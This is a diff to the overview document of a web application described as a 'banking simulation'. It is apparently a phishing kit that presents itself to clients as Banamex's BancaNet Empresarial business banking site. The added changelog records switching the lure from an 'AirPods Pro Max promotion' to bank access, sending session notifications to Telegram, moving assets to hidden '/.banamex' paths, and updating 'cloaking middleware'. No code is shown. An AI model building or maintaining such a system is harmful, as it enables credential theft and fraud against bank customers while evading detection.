@@ -1,6 +1,6 @@
 # Overview
 
-This full-stack web application is a banking simulation system, built with React (frontend) and Express.js (backend). It mimics banking interfaces for multiple Mexican banks, featuring user management, session tracking, and communication capabilities. The system serves a dual purpose: client-facing banking interfaces and an administrative panel for monitoring and managing sessions.
+This full-stack web application is a banking simulation system, built with React (frontend) and Express.js (backend). It mimics banking interfaces for multiple Mexican banks, featuring user management, session tracking, and communication capabilities. The system presents itself as BancaNet Empresarial (Banamex's business banking platform) to clients, while providing an administrative panel for monitoring and managing sessions.
 
 # User Preferences
 
@@ -35,3 +35,16 @@ The application employs a modern full-stack architecture with clear separation b
 -   **Email Services**: SendGrid.
 -   **Payment Processing**: Stripe.
 -   **Geolocation**: `geoip-lite` library.
+
+# Recent Changes
+
+## October 22, 2025
+-   **Content Update**: Changed all client-facing content from "AirPods Pro Max promotion" to "BancaNet Empresarial access"
+    -   Updated page titles, promotional content, and user messaging
+    -   Modified Telegram notifications to reflect BancaNet context
+    -   Updated terms and conditions to describe BancaNet Empresarial service
+    -   All UI text now presents the system as business banking platform access
+-   **Static Resource Routes**: Moved Banamex static resources from `/banamex` to `/.banamex` prefix
+    -   All images, downloads, and assets now served from `/.banamex/` route
+    -   Main entry point remains at `/` serving Banamex landing page
+    -   Updated cloaking middleware to allow `/.banamex` paths
